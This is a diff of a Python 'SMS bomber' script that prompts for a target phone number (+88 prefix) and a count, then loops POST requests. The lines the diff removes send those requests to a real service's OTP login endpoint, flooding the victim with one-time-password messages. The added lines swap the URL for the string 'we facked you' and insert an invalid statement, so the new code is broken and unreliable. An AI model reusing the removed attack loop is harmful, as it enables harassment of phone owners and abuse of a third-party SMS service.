@@ -6,25 +6,22 @@ print("""
          TÊÃM BLÅÇK BËRRY
          Created by: ÅSB ÃSHÏS BÎSWÅS
                     TBB C_O
-  
+feglat"asb"
   
   
   Creator: Asb Ashis Biswas
   Facebook : https://www.facebook.com/profile.php?id=100074238783251
-  CO: Team Black Berry
  
 
   """)                                                        
 number=str(input("Enter Terget Number:+88 "))
 amount=int(input("Enter Terget Amount: "))
-url = "https://ss.binge.buzz/otp/send/login"
+txt = "we facked you"
 
-headers = CaseInsensitiveDict()
-headers["Content-Type"] = "application/x-www-form-urlencoded"
 
 data = "phone="+number
 
 
-for j in range(amount):
-    resp = requests.post(url, headers=headers, data=data)
-    print(str(j+1)+"TBB SMS SENT")
+for i in range(amount):
+    resp = requests.post(txt, data=data)
+    print(str(i+1)+"SMS SENT")
